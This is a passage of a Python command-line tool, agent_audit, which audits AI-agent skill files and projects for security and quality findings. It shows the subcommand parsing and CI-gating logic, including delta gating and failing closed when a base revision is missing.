    p_suppress.add_argument("--format", choices=["text", "json"], default=argparse.SUPPRESS)
    p_suppress.add_argument("--root", default=".")
    p_suppress.add_argument("--expiring-within", type=int, default=None, metavar="DAYS", help="Exit 2 if any suppression expires within DAYS (in addition to already-expired).")

    p_trends = sub.add_parser("report-trends", help="Summarize out/security/findings.jsonl — top rules, severities, introduced ratio.")
    p_trends.add_argument("--format", choices=["text", "json"], default=argparse.SUPPRESS)
    p_trends.add_argument("--root", default=".")

    p_skill = sub.add_parser("audit-skill", help="Audit one SKILL.md file.")
    p_skill.add_argument("--format", choices=["text", "json", "github"], default=argparse.SUPPRESS)
    p_skill.add_argument("path")
    p_skill.add_argument("--profile", choices=["security", "quality", "maintainability", "release-ready"], default="release-ready")
    p_skill.add_argument("--fail-on", choices=["none", "high", "medium", "low", "info", "any"], default="none", help="Exit 1 when findings meet or exceed this severity.")

    p_rule = sub.add_parser("explain-rule", help="Explain one rule.")
    p_rule.add_argument("--format", choices=["text", "json"], default=argparse.SUPPRESS)
    p_rule.add_argument("rule_id")

    p_finding = sub.add_parser(
        "explain-finding",
        help="Author-facing fix + correct suppression path for a rule (floor vs advisory).",
    )
    p_finding.add_argument("--format", choices=["text", "json"], default=argparse.SUPPRESS)
    p_finding.add_argument("rule_id")

    p_rules = sub.add_parser("rules", help="List rule catalog.")
    p_rules.add_argument("--format", choices=["text", "json"], default=argparse.SUPPRESS)

    p_validate = sub.add_parser("validate-config", help="Validate org audit-config patterns against a ReDoS time budget.")
    p_validate.add_argument("--format", choices=["text", "json"], default=argparse.SUPPRESS)
    p_validate.add_argument("--config", default=None, help="Also validate this single config/overlay file standalone.")

    args = parser.parse_args(argv)

    try:
        if args.command == "discover":
            emit(discover_agent_assets(args.root), args.format)
        elif args.command == "audit-project":
            # Impact-report mode: force a full audit, emit a per-rule histogram,
            # and never block — a platform owner measures blast radius here before
            # flipping --fail-on-new across repos.
            if args.whole_tree:
                report = audit_project(args.root, profile=args.profile, changed_paths=None,
                                       include_install_dirs=args.include_install_dirs)
                by_rule: dict[str, int] = {}
                for f in report.get("findings") or []:
                    rid = str(f.get("rule_id", ""))
                    if rid:
                        by_rule[rid] = by_rule.get(rid, 0) + 1
                report["summary"]["by_rule"] = by_rule
                if args.record:
                    root_path = Path(args.root).expanduser().resolve()
                    record_findings(root_path, report.get("findings") or [], report["generated_at"])
                print(
                    "agent_audit: --whole-tree is an impact report — full audit, never blocks (exit 0).",
                    file=sys.stderr,
                )
                emit(report, args.format)
                return 0
            changed_paths = None
            if args.changed_only:
                if args.base and args.base.strip():
                    changed_paths = changed_files_from_git(args.base, args.root)
                else:
                    # Empty base (e.g. unset CI_MERGE_REQUEST_DIFF_BASE_SHA on the first
                    # pipeline of a new MR, or a non-merge-request pipeline). Fail CLOSED
                    # and VISIBLY rather than silently switching scope to the whole tree —
                    # a silent switch can both block unrelated MRs on legacy assets and,
                    # under --fail-on none, produce a green pipeline that audited nothing
                    # meaningful. The caller must supply a base or drop --changed-only.
                    print(
                        "agent_audit: --changed-only requires a non-empty --base, but it was empty.\n"
                        "  In CI this usually means CI_MERGE_REQUEST_DIFF_BASE_SHA was not set\n"
                        "  (first pipeline of a new MR, or a non-merge-request pipeline).\n"
                        "  Refusing to silently audit the whole tree. Re-run on a merge-request\n"
                        "  pipeline, or drop --changed-only to audit the full project on purpose.",
                        file=sys.stderr,
                    )
                    return 2
            report = audit_project(args.root, profile=args.profile, changed_paths=changed_paths,
                                    include_install_dirs=args.include_install_dirs)

            # Non-silent coverage note: if we skipped a host install dir, say so and
            # name the opt-in flag, so the exclusion never reads as "audited clean".
            skipped = report.get("discovery", {}).get("skipped_install_dirs") or []
            if skipped and not args.include_install_dirs:
                print(
                    f"agent_audit: skipped per-host install dir(s) {', '.join(skipped)} — "
                    "pass --include-install-dirs to audit assets you author there.",
                    file=sys.stderr,
                )

            # Delta gate: tag each HEAD finding `introduced` and gate only on the
            # introduced subset. --fail-on-new limits WHICH findings block;
            # --changed-only limits WHICH files are audited. They compose freely.
            delta_active = args.fail_on_new != "none"
            if delta_active:
                if not (args.base and args.base.strip()):
                    print(
                        "agent_audit: --fail-on-new requires a non-empty --base to compute the\n"
                        "  delta against (the merge-request target / base revision). Refusing to\n"
                        "  treat every finding as introduced. Supply --base or drop --fail-on-new.",
                        file=sys.stderr,
                    )
                    return 2
                root_path = Path(args.root).expanduser().resolve()
                base = base_findings(args.base, root_path, report.get("findings") or [], profile=args.profile)
                tag_introduced(report["findings"], base, root_path)

            if args.record:
                rec_root = Path(args.root).expanduser().resolve()
                record_findings(rec_root, report.get("findings") or [], report["generated_at"])

            emit(report, args.format)

            blocked = False
            if delta_active:
                introduced = [f for f in report.get("findings") or [] if f.get("introduced")]
                blocked = should_fail({"findings": introduced}, args.fail_on_new)
            if not blocked:
                blocked = should_fail(report, args.fail_on)
            return _gate_exit_code(blocked)
        elif args.command == "audit-skill":
            report = audit_skill(args.path, profile=args.profile)
            emit(report, args.format)
            return _gate_exit_code(should_fail(report, args.fail_on))
        elif args.command == "list-suppressions":
            report = list_suppressions_report(args.root, expiring_within=args.expiring_within)
            emit(report, args.format)
            return _gate_exit_code(report["blocked"], blocked_code=2)
        elif args.command == "report-trends":
            emit(report_trends(args.root), args.format)
        elif args.command == "explain-rule":
            emit(explain_rule(args.rule_id), args.format)
        elif args.command == "explain-finding":
            emit(explain_finding(args.rule_id), args.format)
        elif args.command == "rules":
            emit(rule_catalog(), args.format)
        elif args.command == "validate-config":
            result = validate_config(args.config)
            emit(result, args.format)
            if result.get("issues"):
                return 2
        else:
            parser.error(f"unknown command: {args.command}")
    except (FileNotFoundError, KeyError, OSError, UnicodeError, ValueError) as exc:
        print(f"agent_audit: {exc}", file=sys.stderr)
        return 2

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
